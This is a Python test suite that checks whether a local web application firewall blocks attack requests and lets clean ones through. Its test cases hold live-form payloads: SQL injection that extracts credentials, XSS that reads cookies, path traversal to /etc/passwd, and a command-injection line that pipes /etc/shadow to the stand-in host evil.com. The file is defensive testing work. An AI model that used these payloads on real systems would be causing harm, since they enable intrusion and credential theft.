import sys
import time
import requests

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

WAF_URL = "http://127.0.0.1:8080"

TEST_CASES = [
    {
        "name": "SQL Injection (Union SELECT)",
        "method": "GET",
        "url": f"{WAF_URL}/target/search?q=' UNION SELECT 1,username,password FROM users--",
        "expected_status": 403,
        "category": "SQL_INJECTION",
    },
    {
        "name": "SQL Injection (Tautology / Boolean-based)",
        "method": "GET",
        "url": f"{WAF_URL}/target/search?q=admin' OR 1=1--",
        "expected_status": 403,
        "category": "SQL_INJECTION",
    },
    {
        "name": "XSS (Script tag reflection)",
        "method": "GET",
        "url": f"{WAF_URL}/target/search?q=<script>alert('XSS_ATTACK')</script>",
        "expected_status": 403,
        "category": "XSS",
    },
    {
        "name": "XSS (DOM Event Handler)",
        "method": "GET",
        "url": f"{WAF_URL}/target/search?q=<img src=x onerror=alert(document.cookie)>",
        "expected_status": 403,
        "category": "XSS",
    },
    {
        "name": "Path Traversal / LFI (UNIX sensitive file)",
        "method": "GET",
        "url": f"{WAF_URL}/target/view-file?file=../../../../etc/passwd",
        "expected_status": 403,
        "category": "PATH_TRAVERSAL",
    },
    {
        "name": "Path Traversal / LFI (Windows & URL-encoded)",
        "method": "GET",
        "url": f"{WAF_URL}/target/view-file?file=%2e%2e%2f%2e%2e%2fwindows/win.ini",
        "expected_status": 403,
        "category": "PATH_TRAVERSAL",
    },
    {
        "name": "Command Injection / RCE (Shell pipe)",
        "method": "GET",
        "url": f"{WAF_URL}/target/search?q=valid; cat /etc/shadow | curl evil.com",
        "expected_status": 403,
        "category": "COMMAND_INJECTION",
    },
    {
        "name": "Command Injection / RCE (Command substitution)",
        "method": "GET",
        "url": f"{WAF_URL}/target/search?q=$(whoami)",
        "expected_status": 403,
        "category": "COMMAND_INJECTION",
    },
    {
        "name": "Malicious Scanner / Bot (sqlmap User-Agent)",
        "method": "GET",
        "url": f"{WAF_URL}/target/search?q=test",
        "headers": {"User-Agent": "sqlmap/1.7.1#stable (https://sqlmap.org)"},
        "expected_status": 403,
        "category": "BAD_BOT",
    },
    {
        "name": "Legitimate Clean Request (Should Pass)",
        "method": "GET",
        "url": f"{WAF_URL}/target/search?q=machine-learning-in-cybersecurity",
        "expected_status": 200,
        "category": "CLEAN",
    },
    {
        "name": "Legitimate Clean Request with Body",
        "method": "POST",
        "url": f"{WAF_URL}/target/login",
        "json": {"username": "student_user", "action": "profile_check"},
        "expected_status": 200,
        "category": "CLEAN",
    },
]

def run_tests():
    print("=" * 65)
    print(" [*] AegisGuard WAF - Automated Security Verification Suite")
    print("=" * 65)

    passed_count = 0
    total_count = len(TEST_CASES)

    for idx, tc in enumerate(TEST_CASES, start=1):
        method = tc["method"]
        url = tc["url"]
        headers = tc.get("headers", {})
        json_data = tc.get("json", None)

        try:
            if method == "GET":
                resp = requests.get(url, headers=headers, timeout=5)
            else:
                resp = requests.post(url, headers=headers, json=json_data, timeout=5)

            actual_status = resp.status_code
            is_success = actual_status == tc["expected_status"]

            badge = "[+] PASSED" if is_success else "[-] FAILED"
            if is_success:
                passed_count += 1

            print(f"[{idx:02d}/{total_count:02d}] {badge} | {tc['name']}")
            print(f"     Expected: {tc['expected_status']} | Got: {actual_status} | Category: {tc['category']}")
            if not is_success:
                print(f"     Response: {resp.text[:120]}")
            print("-" * 65)
        except Exception as e:
            print(f"[{idx:02d}/{total_count:02d}] [-] ERROR connecting to WAF: {e}")
            print("-" * 65)

    print(f"\n[i] Summary: {passed_count}/{total_count} tests passed successfully!")
    print("=" * 65)

if __name__ == "__main__":
    run_tests()
